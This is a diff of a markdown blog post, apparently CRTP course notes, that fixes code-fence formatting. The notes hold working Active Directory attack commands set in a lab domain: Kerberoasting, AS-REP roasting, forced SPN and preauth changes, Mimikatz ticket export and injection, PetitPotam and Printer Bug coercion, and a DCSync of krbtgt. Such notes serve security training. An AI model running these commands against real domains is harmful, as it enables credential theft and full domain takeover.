@@ -32,42 +32,42 @@ toc: true
 **Find user accounts used as Service accounts**
 
 ActiveDirectory module:
-´´´powershell
+```powershell
 Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
-´´´
+```
 
 PowerView:
-´´´powershell
+```powershell
 Get-DomainUser -SPN
-´´´
+```
 
 Use Rubeus to list Kerberoast stats:
-´´´powershell
+```powershell
 Rubeus.exe kerberoast /stats
-´´´
+```
 
 Use Rubeus to request a TGS:
-´´´powershell
+```powershell
 Rubeus.exe kerberoast /user:svcadmin /simple
-´´´
+```
 
 > **To avoid detections based on Encryption Downgrade for Kerberos EType** (used by likes of MDI - 0x17 stands for rc4-hmac)
 
 Look for Kerberoastable accounts that only support RC4_HMAC:
-´´´powershell
+```powershell
 Rubeus.exe kerberoast /stats /rc4opsec
 Rubeus.exe kerberoast /user:svcadmin /simple /rc4opsec
-´´´
+```
 
 Kerberoast all possible accounts:
-´´´powershell
+```powershell
 Rubeus.exe kerberoast /rc4opsec /outfile:hashes.txt
-´´´
+```
 
 Crack ticket using John the Ripper:
-´´´powershell
+```powershell
 john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt C:\AD\Tools\hashes.txt
-´´´
+```
 
 Learning Objective 14
 
@@ -83,40 +83,40 @@ Learning Objective 14
 **Enumerating accounts with Kerberos Preauth disabled**
 
 Using PowerView:
-´´´powershell
+```powershell
 Get-DomainUser -PreauthNotRequired -Verbose
-´´´
+```
 
 Using ActiveDirectory module:
-´´´powershell
+```powershell
 Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} -Properties DoesNotRequirePreAuth
-´´´
+```
 
 **Force disable Kerberos Preauth**:
 
 Let's enumerate the permissions for RDPUsers on ACLs using PowerView:
-´´´powershell
+```powershell
 Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"} 
 Set-DomainObject -Identity Control1User -XOR @{useraccountcontrol=4194304} -Verbose
 Get-DomainUser -PreauthNotRequired -Verbose
-´´´
+```
 
 **Request encrypted AS-REP for offline brute-force**
 
 Let's use ASREPRoast:
-´´´powershell
+```powershell
 Get-ASREPHash -UserName VPN1user -Verbose
-´´´
+```
 
 To enumerate all users with Kerberos preauth disabled and request a hash:
-´´´powershell
+```powershell
 Invoke-ASREPRoast -Verbose
-´´´
+```
 
 We can use John The Ripper to brute-force the hashes offline:
-´´´powershell
+```powershell
 john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt C:\AD\Tools\asrephashes.txt
-´´´
+```
 
 
 # Targeted Kerberoasting - Set SPN
@@ -125,45 +125,45 @@ john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt C:\AD\Tools\asreph
 - We can then request TGS without special privileges. The TGS can then be **Kerberoasted**.
 
 Let's enumerate the permissions for RDPUsers on ACLs using PowerView:
-´´´powershell
+```powershell
 Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}
-´´´
+```
 
 Using Powerview, see if the user already has a SPN:
-´´´powershell
+```powershell
 Get-DomainUser -Identity supportuser | select serviceprincipalname
-´´´
+```
 
 Using ActiveDirectory module:
-´´´powershell
+```powershell
 Get-ADUser -Identity supportuser -Properties ServicePrincipalName | select ServicePrincipalName
-´´´
+```
 
 Set a SPN for the user (must be unique for the domain)
-´´´powershell
+```powershell
 Set-DomainObject -Identity support1user -Set @{serviceprincipalname=‘dcorp/whatever1'}
-´´´
+```
 
 Using ActiveDirectory module:
-´´´powershell
+```powershell
 Set-ADUser -Identity support1user -ServicePrincipalNames @{Add=‘dcorp/whatever1'}
-´´´
+```
 
 Kerberoast the user:
-´´´powershell
+```powershell
 Rubeus.exe kerberoast /outfile:targetedhashes.txt
 john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt C:\AD\Tools\targetedhashes.txt
-´´´
+```
 
 
 # Kerberos Delegation
 
 Only way to double hoping is:
-´´´
+```
 - Explicit Credentials
 - CredSSP
 - Delegation
-´´´
+```
 
 - Kerberos Delegation allows to **reuse the end-user credentials to access resources hosted on a different server**.
 - This is typically useful in multi-tier service or applications where Kerberos Double Hop is required.
@@ -211,29 +211,29 @@ This could be used to escalate privileges in case we can compromise the computer
 
 
 Discover domain computers which have unconstrained delegation enabled using PowerView:
-´´´powershell
+```powershell
 Get-DomainComputer -UnConstrained
-´´´
+```
 
 Using ActiveDirectory module:
-´´´powershell
+```powershell
 Get-ADComputer -Filter {TrustedForDelegation -eq $True}
 Get-ADUser -Filter {TrustedForDelegation -eq $True}
-´´´
+```
 
 Compromise the server(s) where Unconstrained delegation is enabled.
 
 - We must trick or wait for a domain admin to connect a service on appsrv.
 
 Now, if the command is run again:
-´´´powershell
+```powershell
 Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'
-´´´
+```
 
 The DA token could be reused:
-´´´powershell
+```powershell
 Invoke-Mimikatz -Command '"kerberos::ptt C:\Users\appadmin\Documents\user1\[0;2ceb8b3]-2-0-60a10000-Administrator@krbtgt-DOLLARCORP.MONEYCORP.LOCAL.kirbi"'
-´´´
+```
 
 
 ## Printer Bug
@@ -247,17 +247,17 @@ Invoke-Mimikatz -Command '"kerberos::ptt C:\Users\appadmin\Documents\user1\[0;2c
 
 
 We can capture the TGT of dcorp-dc$ by using Rubeus on dcorp-appsrv:
-´´´powershell
+```powershell
 Rubeus.exe monitor /interval:5 /nowrap
-´´´
+```
 
 And after that run MS-RPRN.exe:
 
 [SpoolSample on GitHub](https://github.com/leechristensen/SpoolSample)
 
-´´´powershell
+```powershell
 MS-RPRN.exe \\dcorp-dc.dollarcorp.moneycorp.local \\dcorp-appsrv.dollarcorp.moneycorp.local
-´´´
+```
 
 If you are attacking from a Linux machine, check out **Coercer**:
 
@@ -267,35 +267,35 @@ We can also use **PetitPotam**.exe:
 
 [PetitPotam on GitHub](https://github.com/topotam/PetitPotam)
 
-´´´powershell
+```powershell
  .\PetitPotam.exe us-web us-dc
-´´´
+```
 
 On us-web:
-´´´powershell
+```powershell
 .\Rubeus.exe monitor /interval:5
-´´´
+```
 
 > PetitPotam uses **EfsRpcOpenFileRaw** function of **MS-EFSRPC** (Encrypting File System Remote Protocol) protocol and doesn't need credentials when used against a DC.
 
 
 
 Copy the base64 encoded TGT, remove extra spaces (if any) and use it on the student VM:
-´´´powershell
+```powershell
 Rubeus.exe ptt /ticket:
-´´´
+```
 
 Or use Invoke-Mimikatz:
-´´´powershell
+```powershell
 [IO.File]::WriteAllBytes("C:\AD\Tools\USDC.kirbi",
 [Convert]::FromBase64String("ticket_from_Rubeus_monitor"))
 Invoke-Mimikatz -Command '"kerberos::ptt C:\AD\Tools\USDC.kirbi"'
-´´´
+```
 
 Once the ticket is injected, run DCSync:
-´´´powershell
+```powershell
 Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
-´´´
+```
 
 Learning Objective 15
 
@@ -312,35 +312,32 @@ Constrained Delegation when enabled on a service account, allows access only to 
 - A typical scenario where constrained delegation is used - A user authenticates to a web service without using Kerberos and the web service makes requests to a database server to fetch results based on the user's authorization.
 - To impersonate the user, Service for User (S4U) extension is used which provides two extensions:
 
-´´´
 
+```
 – Service for User to Self (S4U2self) 
 # Allows a service to obtain a forwardable TGS to itself on behalf of a user.
 
 – Service for User to Proxy (S4U2proxy) 
 # Allows a service to obtain a TGS to a second service on behalf of a user.
-
-´´´	
+```
 
 > **SeEnableDelegation privileges** are needed to configure Constrained Delegation.
 
 Two ways to configure constrained delegation:
-´´´
+```
 Kerberos only: Kerberos authentication is needed for the service to delegate.
 Protocol transition: Regardless of authentication the service can delegate.
-´´´
+```
 
 To impersonate the user, Service for User (S4U) extension is used which provides two extensions:
 
-´´´
-
+```
 – Service for User to Self (S4U2self) - Allows a service to obtain a forwardable TGS to itself on behalf of a user with just the user principal name without supplying a password. 
-The service account must have the TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION - T2A4D UserAccountControl attribute.
+# The service account must have the TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION - T2A4D UserAccountControl attribute.
 
 – Service for User to Proxy (S4U2proxy) - Allows a service to obtain a TGS to a second service on behalf of a user. 
 # Which second service? This is controlled by msDS-AllowedToDelegateTo attribute. This attribute contains a list of SPNs to which the user tokens can be forwarded.
-
-´´´
+```
 
 ![Alt text](/assets/images/posts/crtp/19.png){: .align-center}
 
